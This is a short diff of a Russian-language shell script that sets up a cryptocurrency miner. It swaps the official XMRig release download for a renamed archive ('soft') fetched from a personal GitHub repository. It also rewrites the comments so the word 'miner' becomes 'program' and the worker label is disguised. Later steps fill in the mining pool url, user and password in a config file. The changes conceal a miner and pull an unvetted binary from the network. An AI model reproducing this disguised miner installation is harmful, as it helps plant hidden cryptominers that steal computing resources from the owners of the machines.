@@ -20,12 +20,12 @@ BASE_DIR=$(pwd)
 mkdir -p "$folder_name"
 cd "$folder_name" || exit
 
-# 4. Скачиваем и распаковываем майнер
-wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz
+# 4. Скачиваем и распаковываем программу
+wget https://github.com/kotee228/start_pesok/releases/download/soft/soft-6.25.0.tar.gz
 tar -xzf soft-6.25.0.tar.gz
 rm soft-6.25.0.tar.gz
 
-# 5. Переименовываем папку в имя воркера и заходим в неё
+# 5. Переименовываем папку в имя программы и заходим в неё
 mv soft-6.25.0 "$folder_name"
 cd "$folder_name" || exit
 
@@ -34,7 +34,7 @@ mv soft "$folder_name"
 
 # 7. Скачиваем конфиг (замени ссылку на свою реальную)
 # wget https://raw.githubusercontent.com/твой_путь/config.json
-echo "Ожидаю наличие config.json в папке..."
+# echo "Ожидаю наличие config.json в папке..."
 
 # 8. Замена данных в JSON
 # Меняем url, user и pass (имя программы)
